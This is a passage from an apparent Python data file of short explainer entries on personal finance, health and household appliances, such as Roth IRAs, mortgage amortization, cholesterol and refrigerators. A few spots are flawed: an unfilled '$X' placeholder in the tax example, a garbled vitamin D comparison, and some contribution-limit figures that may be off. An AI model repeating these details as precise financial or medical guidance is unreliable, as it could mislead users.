    "what": "two main asset classes. A stock is fractional ownership in a company -- you participate in profits and losses without a guaranteed return. A bond is a loan to a government or corporation -- you receive fixed interest payments and your principal back at maturity, assuming no default",
    "how": "stocks pay returns through price appreciation and dividends; their value rises and falls with company performance and market sentiment. Bonds pay periodic coupons (e.g., 4% annually) and return face value at maturity. Bond prices move inversely to interest rates -- if rates rise, existing low-coupon bonds become less valuable",
    "why": "stocks historically return ~10% annually before inflation but with high volatility (-30% in bad years). Bonds return ~4-5% with much less volatility. A balanced portfolio uses stocks for growth and bonds for stability -- the classic 60/40 allocation, though the right mix depends on age, goals, and risk tolerance",
    "vs": "stocks are claims on residual profits after debts are paid -- equity holders are last in line if a company fails. Bondholders rank ahead of equity in bankruptcy and receive promised payments first. Stocks have unlimited upside; bonds have capped upside (the coupon) but more predictability",
    "ex": "buying $10K of Apple stock and $10K of a 10-year Treasury: the Apple position might double or halve over a decade; the Treasury pays ~4.5% annually for 10 years and returns the $10K at maturity, regardless of Apple's performance or interest rate moves (assuming you hold to maturity)",
    "mis": "people think bonds are risk-free; they have credit risk (issuer default), interest-rate risk (price drops when rates rise), and inflation risk (fixed payments lose real value). Treasuries eliminate credit risk; the others remain. Another myth is that stocks are gambling -- broad-market index investing has positive expected returns over long horizons",
}
T["401(k) vs Roth IRA"] = {
    "what": "two tax-advantaged retirement accounts in the US. A traditional 401(k) is an employer-sponsored plan with pre-tax contributions and taxable withdrawals. A Roth IRA is an individual account with after-tax contributions and tax-free withdrawals, including all growth",
    "how": "401(k) contributions in 2026 cap at $23,500 ($31,000 if 50+) and lower your taxable income; many employers match (free money). Roth IRA contributions cap at $7,500 ($8,500 if 50+) and don't reduce current taxes, but qualified withdrawals after 59 1/2 are 100% tax-free. Income limits restrict direct Roth IRA contributions for high earners",
    "why": "the choice depends on whether you'd rather pay tax now (Roth) or later (traditional). If you expect higher tax rates in retirement than today, Roth wins. If lower, traditional wins. Most experts recommend capturing the full 401(k) match first, then funding a Roth IRA, then maxing 401(k) contributions",
    "vs": "401(k) has higher contribution limits and employer matches but limited investment menus. Roth IRA has lower limits but vastly more flexibility -- any brokerage, any investments. Tax-wise, Roth is paid up front and grows tax-free; traditional defers all tax until withdrawal",
    "ex": "early-career earner in the 12% bracket: contribute enough to 401(k) to capture the match, then contribute $7,500/year to a Roth IRA. The Roth is paid at 12% now, grows tax-free, and is withdrawn tax-free in retirement -- when their effective rate may be much higher",
    "mis": "people think Roth always wins because tax-free withdrawals sound great; if you'll be in a much lower bracket in retirement, traditional comes out ahead because you saved more in taxes today. Another myth is that you must choose one -- you can split contributions across both",
}
T["emergency funds"] = {
    "what": "a stash of liquid savings set aside specifically to cover unexpected expenses (car repair, medical bill, layoff) without going into debt or selling investments at a bad time. The standard recommendation is 3-6 months of essential expenses, kept in a high-yield savings account",
    "how": "calculate monthly essential expenses (rent, food, utilities, insurance, minimum debt payments), multiply by 3-6 (closer to 3 if dual income and stable, closer to 6 if single income or irregular). Build the fund gradually before aggressive investing, keep it in an account separate from your checking, and use it only for true emergencies",
    "why": "without an emergency fund, every surprise becomes a credit card debt at 20%+ APR or a forced investment liquidation at the worst time. With one, you handle setbacks calmly and keep long-term plans intact. It is the single most consistent recommendation across personal finance experts",
    "vs": "compared with a credit card 'emergency line', a fund avoids interest and the risk of the line being cut just when you need it. Compared with keeping cash under the mattress, a high-yield savings account earns ~4-5% while remaining FDIC-insured and instantly accessible",
    "ex": "a household with $4,000/month essential expenses targets $12K-$24K. They open an Ally or Marcus high-yield savings account paying 4.5%, set up automatic $400/month transfers, and reach $12K in 30 months while still investing in their 401(k). The fund earns ~$540/year in interest passively",
    "mis": "people overlap their emergency fund with their checking account; mixing makes it too easy to spend. Another myth is that you need 12+ months saved before investing -- delaying retirement contributions costs more long-term than incrementally building the fund alongside investing",
}
T["mortgage amortization"] = {
    "what": "the process by which mortgage payments gradually pay down both interest and principal over the loan's term. Each payment is the same dollar amount, but the split between interest and principal shifts -- early payments are mostly interest, later payments are mostly principal",
    "how": "the bank calculates a level payment that, over the term, fully repays the loan. Each month, interest is computed on the remaining balance; the rest of the payment reduces principal. As principal shrinks, less interest accrues and more of each payment goes to principal -- the curve is exponential",
    "why": "understanding amortization explains why mortgages cost so much (a 30-year $400K loan at 7% costs ~$558K in interest alone), why early extra payments dramatically reduce total interest, and why refinancing later gives less benefit than refinancing earlier in the loan",
    "vs": "compared with simple-interest loans where you pay equal principal payments plus declining interest, fully amortizing loans give predictable level payments. Compared with interest-only loans (popular in the 2000s housing bubble), amortizing loans build equity gradually but require larger payments",
    "ex": "$400K, 30-year, 7% mortgage: monthly payment ~$2,661. The first month's interest is $400K * 7% / 12 = $2,333; only $328 reduces principal. By year 15, the split is closer to half-and-half. By year 28, almost the entire payment goes to principal. An extra $200/month payment shaves ~6 years off the term and saves ~$110K in interest",
    "mis": "people think doubling their payment cuts the term in half; it cuts it more aggressively because every dollar of extra principal compounds in saved future interest. Another myth is that you 'lose' interest paid in early years -- you get the money you borrowed; you just paid for it",
}
T["credit scores"] = {
    "what": "a numerical estimate (typically 300-850 in the US) of how likely you are to repay debt. The two main models are FICO and VantageScore, each computed from credit bureau data on payment history, balances, account age, and recent inquiries",
    "how": "FICO weights ~35% payment history, 30% amounts owed (utilization), 15% length of history, 10% new credit, 10% credit mix. Late payments, high utilization (>30% of limits), recent inquiries, and short history hurt scores. On-time payments, low utilization, and long history help",
    "why": "credit scores affect mortgage rates (a 50-point swing can change a 30-year payment by hundreds of dollars), insurance premiums in many states, rental approvals, and even some job offers. Maintaining a good score is one of the highest-return personal-finance habits",
    "vs": "FICO and VantageScore use similar inputs but different formulas; they typically agree within 20-50 points. Different lenders pull different versions (FICO 8, FICO 9, mortgage-specific FICOs), so the score you see in apps may not match what a lender sees",
    "ex": "credit utilization: paying down a $9,000 credit-card balance to $300 on a $10K limit can lift your score by 30-50 points within a month, because reported utilization drops from 90% to 3%. Closing the same card would shrink your total available credit and could hurt your score",
    "mis": "people think checking your own score hurts it -- soft inquiries (your own checks, prequalifications) don't affect scoring. Hard inquiries from new credit applications do, but only by a few points. Another myth is that carrying a balance helps your score; paying in full is fine and saves interest",
}
T["inflation's impact on savings"] = {
    "what": "inflation erodes the purchasing power of cash savings over time. If you hold money under your mattress and inflation runs at 3% annually, that money buys 26% less in 10 years and 45% less in 20 years. Real wealth requires returns at or above the inflation rate",
    "how": "the Consumer Price Index measures the change in a basket of goods. If CPI rises 3% per year, $100 today buys what $97 buys next year. Cash earning 0% loses 3% in real terms; a 4% savings account earns ~1% in real terms; investments returning 8% earn ~5% in real terms",
    "why": "inflation explains why retirement plans must invest, not just save in cash, and why TIPS and I-bonds matter for protecting against unexpected inflation. The 2021-2023 surge to 8-9% inflation reminded a generation that low inflation isn't guaranteed and cash positions can lose double-digit real value quickly",
    "vs": "compared with deflation (falling prices), modest inflation is generally considered economically healthy because it discourages hoarding and rewards productive investment. Hyperinflation destroys savings outright. Most central banks target ~2% inflation as a buffer above zero",
    "ex": "$100K saved as cash in 2010 buys what ~$73K bought then, after roughly 30% cumulative inflation through 2024. The same $100K in an S&P 500 index fund grew to ~$420K nominal, ~$310K real -- the difference between losing purchasing power and tripling it",
    "mis": "people think savings are safe; they are nominally safe but real-value-eroded by inflation. Another myth is that all assets hedge inflation equally; growth stocks and TIPS tend to keep up; long-duration bonds suffer; gold has decade-by-decade mixed results",
}
T["tax brackets and marginal rates"] = {
    "what": "income tax systems where progressively higher slices of income are taxed at higher rates. The US has seven federal brackets (10%, 12%, 22%, 24%, 32%, 35%, 37% in 2024). Your 'marginal rate' is the rate on your last dollar earned, not your effective rate on all income",
    "how": "for a single filer with $100K taxable income, the first ~$11K is taxed at 10%, the next slice at 12%, and so on -- so income above the 22% bracket threshold (~$45K) is taxed at 22% per dollar. The total tax bill divided by total income gives the effective rate, which is always lower than the marginal rate",
    "why": "understanding marginal rates is essential for decisions like contributing to a traditional vs Roth retirement account, accepting overtime or a raise, or realizing capital gains. A common mistake is fearing a raise will 'push you into a higher bracket' costing you money -- it just taxes the new dollars at a higher rate",
    "vs": "compared with flat tax systems (Estonia, parts of Eastern Europe), progressive brackets tax wealthier income at higher rates. Compared with consumption taxes (VAT), income brackets target lifetime earnings rather than lifetime spending. Different states layer additional brackets on top of federal",
    "ex": "earning $1,000 of overtime when you're at the top of the 22% bracket: federal tax is $220 on that $1,000, you keep $780 (less FICA and state). Earning $1,000 above the bracket threshold: $X taxed at 22%, the rest at 24% -- still mostly the same. You always net more by earning more",
    "mis": "the universal myth: 'a raise pushed me into a higher bracket and I take home less'. Mathematically impossible in a marginal system; only specific benefit cliffs (subsidies, EITC phaseouts) can produce that effect. Another myth is that the top rate applies to your whole income; it applies only to dollars in the top bracket",
}
T["estate planning basics"] = {
    "what": "the process of arranging the management and disposition of your assets in case of incapacity or death. Core documents include a will, beneficiary designations on retirement and insurance accounts, a durable power of attorney, an advance directive (living will), and possibly a revocable trust",
    "how": "a will names guardians for minor children, executors, and beneficiaries, and goes through probate. Beneficiary designations on 401(k)s, IRAs, and life insurance pass directly outside probate. A revocable living trust can hold assets to bypass probate and provide ongoing management. POA and advance directive cover incapacity",
    "why": "without estate planning, state intestacy laws decide who inherits, courts choose guardians for your children, and probate adds delay and cost. With a basic plan, you control these decisions and spare your heirs months of paperwork. The value is enormous relative to the cost (a few hundred to a few thousand dollars)",
    "vs": "a will alone is the minimum; a revocable trust adds probate avoidance and incapacity management at higher setup cost. Beneficiary designations override your will -- always update them after major life events. Joint ownership and TOD (transfer-on-death) registrations also bypass probate for specific assets",
    "ex": "a young couple with one child: simple wills naming each other as primary beneficiary and the spouse's parents as guardians, durable POAs, advance directives, and updated 401(k)/insurance beneficiaries. Cost: $300-$1500 with an attorney, or much less with a service like Trust & Will. Avoids months of probate trouble if both parents die",
    "mis": "people think estate planning is only for the wealthy; the will, guardianship, and incapacity documents matter at any wealth level. Another myth is that joint ownership of everything avoids the need for planning -- it sidesteps probate but creates other risks (creditors of the joint owner reach the asset)",
}

# === EVERYDAY_LIFE: health ===
T["sleep cycles and REM"] = {
    "what": "sleep is organized into ~90-minute cycles that repeat 4-6 times per night. Each cycle progresses through three NREM (non-REM) stages of progressively deeper sleep, then a REM (rapid eye movement) phase where most vivid dreaming occurs",
    "how": "stage 1 NREM is light sleep transitioning from wake; stage 2 features sleep spindles and K-complexes; stage 3 (slow-wave sleep) is deep restorative sleep. Then REM follows, when the brain is highly active, eyes dart, and skeletal muscles are paralyzed (atonia). Cycles change shape across the night -- early cycles have more deep sleep, late cycles more REM",
    "why": "different stages serve different functions. Slow-wave sleep consolidates declarative memory and supports physical recovery. REM consolidates emotional memory and procedural learning. Disrupting either compromises mood, memory, and immune function, so a 6-hour night that cuts late-cycle REM has outsized effects",
    "vs": "compared with continuous shallow sleep, cycling through deep and REM is what makes sleep restorative. Compared with daytime naps, full overnight sleep includes more REM. REM-suppressing drugs (alcohol, some antidepressants) leave you 'rested' nominally but cognitively impaired",
    "ex": "a typical 8-hour sleep: ~5 cycles. The first cycle has ~30 minutes of deep slow-wave sleep and ~10 minutes of REM. The last cycle has minimal deep sleep and ~30 minutes of REM. Waking from REM produces vivid dream recall; waking from deep sleep produces grogginess (sleep inertia)",
    "mis": "people think any sleep is equal -- a fragmented 8 hours is far less restorative than 7 unbroken hours. Another myth is that you can cycle 4 times in 6 hours and be fine -- the architecture compresses, but you lose meaningful REM and emotional regulation suffers",
}
T["the role of fiber in digestion"] = {
    "what": "fiber is the indigestible portion of plant foods. Soluble fiber (in oats, beans, apples) dissolves in water, forming a gel that slows digestion and lowers cholesterol. Insoluble fiber (in whole grains, vegetables) adds bulk and speeds transit through the gut",
    "how": "soluble fiber binds bile acids, prompting the liver to use cholesterol to make more, lowering blood LDL. It also slows glucose absorption, blunting blood sugar spikes. Insoluble fiber retains water, increases stool bulk, and shortens colonic transit time -- preventing constipation and reducing exposure of the colon wall to harmful compounds",
    "why": "adequate fiber (25-38g/day for adults) reduces risk of cardiovascular disease, type 2 diabetes, colorectal cancer, and constipation. The average American consumes ~15g/day -- well below recommendations. Increasing fiber is one of the highest-leverage dietary changes most people can make",
    "vs": "compared with refined grains (low fiber), whole grains keep more bran and germ. Compared with fiber supplements (psyllium, methylcellulose), whole-food fiber comes packaged with vitamins, minerals, and phytochemicals -- supplements help but don't replicate the broader benefit",
    "ex": "swapping white rice for brown rice, white bread for whole-grain, and adding a serving of beans daily takes a typical Western diet from ~15g to ~30g of fiber. Within a few weeks, transit time normalizes, satiety improves, and over months blood lipids and glycemic control measurably improve",
    "mis": "people think fiber just 'cleans you out'; its mechanisms are far broader -- gut microbiome feeding, bile acid binding, glycemic control. Another myth is that a sudden fiber increase is fine; ramping up too fast causes bloating and gas as the microbiome adjusts. Increase gradually over weeks",
}
T["hydration and electrolytes"] = {
    "what": "hydration is maintaining adequate body water; electrolytes are charged minerals (sodium, potassium, chloride, calcium, magnesium) that regulate fluid balance, nerve conduction, and muscle contraction. Fluid balance depends on both water intake and electrolyte content",
    "how": "kidneys regulate fluid and electrolyte levels via hormones (ADH, aldosterone). Sweat loses both water and sodium; replacing only water (without electrolytes) during heavy sweating dilutes sodium, potentially causing hyponatremia. Most people get enough electrolytes from food -- supplementation matters mainly during prolonged exercise or illness",
    "why": "dehydration impairs cognition, mood, and exercise performance starting at 1-2% body weight loss. Severe dehydration causes heatstroke and organ damage. Electrolyte imbalances (low sodium, low potassium) can cause cramps, irregular heartbeat, and in extreme cases seizures",
    "vs": "compared with plain water, sports drinks add carbohydrate and electrolytes appropriate for endurance exercise (>60 minutes) but unnecessary for daily life. Coconut water has natural potassium but variable composition. Oral rehydration solutions (Pedialyte, WHO formula) are the gold standard for medical dehydration",
    "ex": "a marathon runner sweating 1.5 L/hour at high sodium concentration loses ~2-3g of sodium in a 4-hour run. Drinking only water risks hyponatremia (dilutional low sodium); a sports drink at 400-700mg/L sodium maintains balance. For a casual 30-minute jog, water is fine",
    "mis": "people think 8 cups of water a day is medically required; the figure has no good evidence base. Total water intake (food + drinks) of ~2.5L/day for women and ~3.5L/day for men is reasonable. Another myth is that you need electrolyte drinks daily -- food covers it for most people without intense exercise",
}
T["aerobic vs anaerobic exercise"] = {
    "what": "two energy systems that fuel exercise. Aerobic ('with oxygen') exercise -- jogging, cycling, swimming -- is sustained activity at moderate intensity where oxygen meets demand. Anaerobic ('without oxygen') exercise -- sprinting, heavy lifting -- is brief intense effort that exceeds the oxygen supply",
    "how": "aerobic exercise burns fat and carbohydrates via oxidative phosphorylation in mitochondria, producing ATP efficiently. Anaerobic exercise burns glucose anaerobically (glycolysis), producing ATP rapidly but accumulating lactate. The body switches between systems on a continuum based on intensity",
    "why": "aerobic exercise builds cardiovascular endurance, burns calories, and lowers resting heart rate and blood pressure. Anaerobic exercise builds strength, power, and bone density, and boosts metabolism long after the workout. Both contribute to health -- a complete program includes them",
    "vs": "aerobic is sustained, moderate intensity, fat-burning, builds endurance. Anaerobic is brief, high intensity, glycogen-burning, builds strength and power. HIIT (high-intensity interval training) blends both: short anaerobic bursts with aerobic recovery, delivering benefits of each in less time",
    "ex": "30 minutes of zone-2 cycling (talking pace, ~70% max heart rate) is aerobic -- you can sustain it indefinitely while burning fat. A set of 5-rep heavy squats is anaerobic -- you can sustain it for ~30 seconds before lactate accumulates and forces a rest",
    "mis": "people think aerobic alone covers fitness; without resistance training, aging adults lose muscle mass (sarcopenia) and bone density. Another myth is that 'fat-burning zone' (low intensity) is the most effective for weight loss -- total calorie expenditure matters more, and higher intensities burn more total calories per minute",
}
T["vaccine mechanisms"] = {
    "what": "vaccines train the immune system to recognize and respond to pathogens without causing disease. They expose the immune system to weakened, killed, or just specific antigens of a pathogen, generating immunological memory that mounts a fast effective response on real infection",
    "how": "different platforms use different methods. Live attenuated (MMR, varicella) use weakened viruses. Inactivated (flu shot, hepatitis A) use killed pathogens. Subunit (HPV, hepatitis B) use specific proteins. mRNA (COVID, RSV in 2024+) deliver instructions for cells to make a target protein. All produce antibodies and T-cell memory",
    "why": "vaccination is one of the highest-impact public health interventions ever -- eradicating smallpox, slashing measles deaths from millions to thousands, controlling polio. The COVID mRNA vaccines were estimated to have prevented 14-20 million deaths globally in 2021 alone",
    "vs": "compared with natural infection (which also produces immunity), vaccines deliver immunity without the disease -- no risk of complications, hospitalization, or long-term effects. Compared with monoclonal antibodies (passive immunity, short-term), vaccines build active immunity that lasts months to decades",
    "ex": "the mRNA COVID vaccine: lipid nanoparticles deliver mRNA encoding the SARS-CoV-2 spike protein. Cells transiently produce the spike, immune cells recognize it as foreign, and produce antibodies plus T-cell memory. The mRNA degrades within days; the immune memory persists for months",
    "mis": "people think vaccines 'overload' the immune system; infants encounter far more antigens daily from food and environment than from the entire vaccine schedule. Another myth is that natural immunity is always better -- it works but at the cost of running the disease, which can be lethal or disabling",
}
T["the placebo effect"] = {
    "what": "a measurable improvement in symptoms or condition produced by a treatment with no therapeutic ingredient -- a sugar pill, a sham procedure, or even just the ritual of receiving care. The effect is real and reproducible, mediated by expectation, conditioning, and brain mechanisms",
    "how": "expectation of benefit triggers neurobiological changes: endogenous opioids release for pain relief, dopamine release for reward, immune modulation. The patient's brain literally produces some of the effects the real drug would. Conditioning (associating pills with relief over many doses) reinforces the response",
    "why": "the placebo effect explains why many alternative treatments seem to work and why drug trials require placebo controls -- the real drug must beat both no treatment AND placebo to be deemed effective. It also matters for clinical practice: the way care is delivered shapes outcomes beyond the active ingredient",
    "vs": "compared with a true pharmacological effect, placebo response is mediated entirely by the patient's brain and is highly variable across individuals and conditions. The nocebo effect is its mirror -- expectation of harm produces actual symptoms. Both are real and significant in clinical research",
    "ex": "in some trials, placebo arms show 30-40% pain reduction in chronic pain conditions. The active drug must demonstrate benefit beyond that high baseline. For depression, placebo response can exceed 50% in some trials, making it hard to demonstrate efficacy of antidepressants in mild cases",
    "mis": "people think placebo means 'fake' or 'in your head'; it's a real biological effect with neuroimaging signatures. Another myth is that placebo only works for psychological conditions; it modulates pain, immune response, and even some objective measures, though it does not shrink tumors or fix structural damage",
}
T["blood pressure regulation"] = {
    "what": "the body's mechanisms for maintaining arterial blood pressure within a narrow range despite varying activity, posture, and fluid status. Blood pressure (the force blood exerts on artery walls) depends on cardiac output and total peripheral resistance, regulated by neural and hormonal feedback",
    "how": "baroreceptors in the carotid sinus and aortic arch detect pressure changes and signal the brainstem, which adjusts heart rate and vascular tone via the autonomic nervous system. Long-term regulation involves the kidneys: the renin-angiotensin-aldosterone system controls fluid volume and vasoconstriction over hours to days",
    "why": "hypertension (sustained high BP) damages arteries, kidneys, eyes, and heart, dramatically raising risk of stroke, heart attack, kidney failure, and dementia. Lowering BP through diet, exercise, and medication is one of the highest-leverage interventions in modern medicine",
    "vs": "acute control (seconds to minutes, neural) handles posture changes and exercise. Long-term control (days to weeks, hormonal/renal) sets the baseline. Hypertension typically reflects long-term dysregulation -- excess sodium, vascular stiffness, kidney issues, or genetic factors -- not short-term spikes",
    "ex": "standing up: gravity pools blood in the legs; baroreceptors detect the drop; the brainstem signals increased heart rate and vasoconstriction within seconds. If this response is sluggish (orthostatic hypotension), you feel lightheaded -- common in dehydration, certain medications, and aging",
    "mis": "people think one high reading means hypertension; diagnosis requires multiple readings over time. Another myth is that you 'feel' high blood pressure -- it is largely silent until end-organ damage occurs, which is why screening matters and why hypertension is called the 'silent killer'",
}
T["cholesterol (HDL vs LDL)"] = {
    "what": "cholesterol is a waxy lipid essential for cell membranes, hormones, and bile acids. It travels in the blood inside lipoproteins. LDL (low-density lipoprotein) carries cholesterol to tissues; high LDL deposits in artery walls. HDL (high-density lipoprotein) removes cholesterol back to the liver",
    "how": "the liver produces most cholesterol; dietary intake contributes less than the liver's own synthesis. LDL particles deliver cholesterol to cells; oxidized LDL gets trapped in artery walls and triggers atherosclerotic plaques. HDL scavenges excess cholesterol and returns it to the liver for disposal -- 'reverse cholesterol transport'",
    "why": "elevated LDL is one of the strongest risk factors for cardiovascular disease. Lowering LDL through diet, exercise, and statins reduces heart attack and stroke risk by 20-40%. The shift from total cholesterol to LDL/HDL ratios reflects better understanding of which fractions matter most",
    "vs": "LDL is often called 'bad' because high levels promote plaque; HDL is called 'good' because it removes cholesterol. Newer lipid tests (apoB, Lp(a)) capture risk more precisely than total cholesterol alone. Triglycerides are a separate fat measurement that also predicts cardiovascular risk",
    "ex": "a standard lipid panel: total cholesterol 220, LDL 140, HDL 45, triglycerides 150. Doctor recommends Mediterranean-style diet, regular exercise, and possibly a statin if cardiovascular risk score is elevated. Re-test in 3 months -- LDL might drop to 110 with diet alone, to <70 with statins",
    "mis": "people think dietary cholesterol (eggs, shrimp) drives blood cholesterol; for most people, saturated and trans fats raise LDL more than dietary cholesterol does. Another myth is that statin side effects are common -- in randomized trials, most reported side effects occur equally on placebo",
}
T["insulin and blood sugar"] = {
    "what": "insulin is a hormone produced by the pancreas that regulates blood glucose. After meals, insulin signals cells to take up glucose from the blood, lowering blood sugar. Low blood sugar between meals triggers glucagon, which raises blood sugar. Failure of this system causes diabetes",
    "how": "after eating, blood glucose rises; pancreatic beta cells release insulin; insulin binds receptors on muscle, fat, and liver cells, triggering glucose uptake (via GLUT4 transporters in muscle/fat) and storage as glycogen or fat. Between meals, insulin falls and the liver releases stored glucose to maintain levels",
    "why": "chronic high blood sugar damages blood vessels, nerves, kidneys, and eyes. Type 1 diabetes is autoimmune destruction of beta cells (need insulin therapy). Type 2 diabetes is insulin resistance (cells respond poorly to insulin); it affects ~10% of US adults and is largely preventable through diet and exercise",
    "vs": "Type 1 diabetes is loss of insulin production; type 2 is loss of insulin sensitivity. Type 1 typically starts in childhood and requires insulin from diagnosis. Type 2 typically develops over years of insulin resistance and is initially treatable with lifestyle and oral medications, with insulin added later if needed",
    "ex": "after a meal of pasta and bread, blood sugar might rise from 90 to 160 mg/dL. Insulin surges, glucose enters cells, and within 2 hours blood sugar returns to ~100. In an insulin-resistant person, the same meal might push glucose to 220 and take 4 hours to return -- chronic exposure damages tissues",
    "mis": "people think type 2 diabetes is purely from eating sugar; it's about chronic energy excess (carbs, fats, total calories) plus genetics. Another myth is that insulin therapy means 'failing' at type 2 -- some patients eventually need it as beta cells fatigue, and insulin treatment is part of normal disease progression",
}
T["the gut-brain axis"] = {
    "what": "the bidirectional communication system between the gastrointestinal tract and the central nervous system. It involves neural pathways (the vagus nerve), hormonal signals (gut peptides), immune mediators, and microbiome-derived metabolites that influence brain and behavior",
    "how": "the gut has its own nervous system (~500 million neurons, the 'second brain'). The vagus nerve carries signals between the gut and brainstem. The microbiome produces neurotransmitters and short-chain fatty acids that modulate immune function and cross the blood-brain barrier or signal indirectly via vagal afferents",
    "why": "gut-brain interactions affect mood, anxiety, appetite, and cognition. Conditions like IBS often have psychological components; depression is associated with altered microbiomes; some experimental psychiatric treatments target the gut. The field is young but growing rapidly -- one of the most active areas in neuroscience and microbiome research",
    "vs": "compared with the older view of 'mind over matter' for gut symptoms, the gut-brain axis explains how physical and psychological aspects intertwine. Compared with isolated nutritional psychiatry claims, well-supported mechanisms include vagal signaling, immune mediation, and microbiome-derived metabolites",
    "ex": "stress slowing digestion is a classic vagal-mediated effect: sympathetic activation diverts blood flow from the gut and inhibits motility, which is why many people lose appetite under acute stress. Conversely, gastric distention signals satiety to the brain through stretch receptors and hormones like CCK and PYY",
    "mis": "people see 'gut-brain' claims and assume any probiotic improves mood; evidence is weak for general benefit, stronger for specific strains in specific conditions. Another myth is that the gut is the 'second brain' literally controlling thoughts; it influences mood and behavior but does not generate cognition",
}
T["mindfulness meditation"] = {
    "what": "a contemplative practice of intentionally paying attention to present-moment experience -- thoughts, sensations, emotions -- with an attitude of acceptance and non-judgment. Rooted in Buddhist tradition, it has been adapted into secular programs like MBSR (mindfulness-based stress reduction)",
    "how": "typical practice involves seated attention to the breath. When the mind wanders (and it will), you notice and gently return attention to the breath without self-criticism. Variations include body scans, loving-kindness meditation, and mindful movement (yoga, walking). Regular practice typically means 10-30 minutes daily",
    "why": "research links mindfulness to reduced anxiety, depression, and chronic pain, plus improvements in attention, emotional regulation, and quality of life. MBSR is now offered in many medical settings as adjunctive treatment for stress-related conditions, though effect sizes for many claims are modest",
    "vs": "compared with relaxation techniques (progressive muscle relaxation, deep breathing alone), mindfulness emphasizes awareness rather than relaxation -- relaxation is a side effect, not the goal. Compared with concentration practices (mantra meditation), mindfulness is open-monitoring -- aware of whatever arises rather than focusing exclusively",
    "ex": "a basic 10-minute practice: sit comfortably, set a timer, focus on the sensation of breath at the nostrils. When thoughts arise (planning, judging), label them softly ('thinking') and return to the breath. Over weeks of daily practice, the noticing-and-returning becomes automatic, transferring to daily life",
    "mis": "people think mindfulness means clearing the mind; the goal is to notice what arises, not eliminate thoughts. Another myth is that benefits require monastic levels of practice; even 10 minutes a day shows measurable effects in studies, though larger effects come with longer practice",
}
T["the role of vitamin D"] = {
    "what": "vitamin D is a fat-soluble vitamin that functions as a hormone, regulating calcium absorption, bone mineralization, and immune function. The body synthesizes it from cholesterol when skin is exposed to UVB sunlight; small amounts come from fatty fish, fortified milk, and supplements",
    "how": "UVB radiation converts 7-dehydrocholesterol in the skin to vitamin D3, which the liver and kidneys convert to active 1,25-dihydroxyvitamin D (calcitriol). Calcitriol binds receptors in nearly every tissue, regulating calcium handling, bone remodeling, immune cell function, and muscle physiology",
    "why": "deficiency causes rickets in children and osteomalacia/osteoporosis in adults. It is also associated with increased infections, some autoimmune conditions, and possibly cardiovascular disease, though causality is debated. Sufficient vitamin D supports bone health, immunity, and muscle strength",
    "vs": "compared with most vitamins (which must come from diet), vitamin D is mostly endogenous -- synthesized from sun exposure. Compared with food sources (fatty fish, fortified milk), even sun-rich climates with regular exposure give far more. People with darker skin, higher latitudes, or indoor lifestyles need more dietary or supplemental sources",
    "ex": "a 25-hydroxyvitamin D blood test result of 18 ng/mL indicates deficiency (sufficient is generally considered ≥30 ng/mL). Supplementation with 2000 IU/day for 3 months typically raises levels to 30-40. Severe deficiency may need higher loading doses prescribed by a doctor",
    "mis": "people think more vitamin D is always better; toxicity occurs above ~150 ng/mL and causes hypercalcemia. Another myth is that everyone needs supplementation -- people with regular sun exposure and varied diets often have sufficient levels. Test before supplementing if uncertain",
}

# === EVERYDAY_LIFE: home / practical ===
T["how a refrigerator works"] = {
    "what": "a refrigerator moves heat from inside the cabinet to outside using a vapor-compression cycle. It doesn't 'create cold' -- it pumps heat against the temperature gradient using mechanical work supplied by an electric compressor",
    "how": "a refrigerant (typically R-134a or R-600a) cycles through four stages: the compressor pressurizes the gas (heating it); the condenser coils on the back release that heat to room air, condensing the gas to liquid; the expansion valve drops pressure, cooling the liquid; the evaporator inside the fridge absorbs heat as the liquid boils back to gas. Repeat",
    "why": "refrigeration transformed food storage, public health, and global trade. Before mechanical refrigeration, perishables traveled in ice and food preservation depended on salting, drying, and fermentation. The same vapor-compression cycle powers air conditioning, heat pumps, and freezers",
    "vs": "compared with thermoelectric coolers (Peltier devices), vapor-compression is far more efficient at meaningful temperature drops. Compared with absorption refrigeration (used in RVs and propane fridges), vapor-compression is more efficient electrically but less convenient where electricity is unavailable",
    "ex": "leaving the door open: warm room air enters, the evaporator works harder to remove the heat, and the compressor runs longer. Multi-day power outage: ice in the freezer slowly absorbs heat as it melts, buying time. After 24-48 hours, food enters the danger zone (>40F) and spoilage organisms grow",
    "mis": "people think the back coils are hot because the compressor is hot; the coils are hot because they're radiating away the heat the refrigerant absorbed inside the cabinet. Another myth is that closing the fridge slowly saves energy -- the air exchange is roughly the same; the cumulative open time matters more",
}
T["how an electric motor works"] = {
    "what": "a device that converts electrical energy into mechanical rotation. A current-carrying wire in a magnetic field experiences a force; arranging coils and magnets so the force always pushes in the same rotational direction creates a motor. The reverse arrangement (mechanical rotation generating electricity) is a generator",
    "how": "in a brushed DC motor, the rotor has coils on a spinning shaft; the stator has permanent magnets. Brushes feed current to the coils through a commutator that switches polarity each half-rotation, keeping the force always pushing the same way. Brushless DC and AC motors use electronic controllers and rotating magnetic fields instead",
    "why": "electric motors drive ~45% of global electricity consumption -- in vehicles, appliances, industrial machinery, pumps, and HVAC. They're the workhorse of the modern world. Efficient motors and variable-speed drives can cut industrial energy use by 20-40%",
    "vs": "DC motors are simple and good for variable speed but brushes wear out. AC induction motors (Tesla's invention) are robust and efficient -- the workhorse of industry. Brushless DC and permanent-magnet synchronous motors dominate EVs and modern appliances for their efficiency and controllability. Stepper motors trade efficiency for precise positioning",
    "ex": "an EV like a Tesla uses three-phase AC induction or permanent-magnet motors capable of 96%+ efficiency at peak. The inverter generates AC of varying frequency from the battery's DC; higher frequency means faster motor rotation. Regenerative braking runs the same motor in reverse as a generator, charging the battery",
    "mis": "people think AC motors run on grid frequency only; modern variable-frequency drives generate any frequency, decoupling motor speed from grid frequency. Another myth is that more powerful motors are always less efficient -- modern industrial motors are more efficient at higher power ratings, not less",
}
T["how a microwave heats food"] = {
    "what": "a microwave oven uses electromagnetic waves at 2.45 GHz to make polar molecules (mostly water, some fats and sugars) rotate rapidly. The friction from this rotation heats the food from within, much faster than conduction from a hot surface",
    "how": "a magnetron generates 2.45 GHz microwaves and feeds them into the cavity through a waveguide. Water molecules try to align with the rapidly oscillating electric field, rotating billions of times per second. The molecular motion is heat. Metal walls reflect microwaves, creating standing-wave patterns -- which is why turntables exist (to even out hot/cold spots)",
    "why": "microwave heating is fast and energy-efficient because energy goes directly into the food rather than into heating air or cookware. It's why you can defrost food, reheat leftovers, or boil water in minutes instead of tens of minutes. The cooking is also gentler in some ways -- no Maillard browning unless food temperatures exceed 140C",
